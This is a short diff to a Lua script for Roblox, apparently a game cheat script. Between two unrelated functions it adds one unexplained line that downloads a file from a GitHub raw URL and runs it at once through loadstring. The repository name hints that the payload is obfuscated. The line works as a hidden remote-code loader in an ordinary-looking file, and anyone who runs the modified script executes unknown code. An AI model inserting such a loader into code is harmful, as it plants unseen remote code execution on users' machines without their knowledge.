@@ -1,3 +1,4 @@
+
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
@@ -322,7 +323,7 @@ function checkplr()
     local table = {lplr.Name, math.huge, math.huge, true}
     if not found then return table end
 end
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Cocol1Hh/Soy-del-Campo-no-compartan-script-quien-logr-Desufusco/refs/heads/main/Datis.lua'))()
 function player()
 	if lplr.Character and lplr.Character:FindFirstChild("Humanoid") then
 		if lplr.Character.Humanoid.Health > 0 and lplr.Character:FindFirstChild("HumanoidRootPart") then
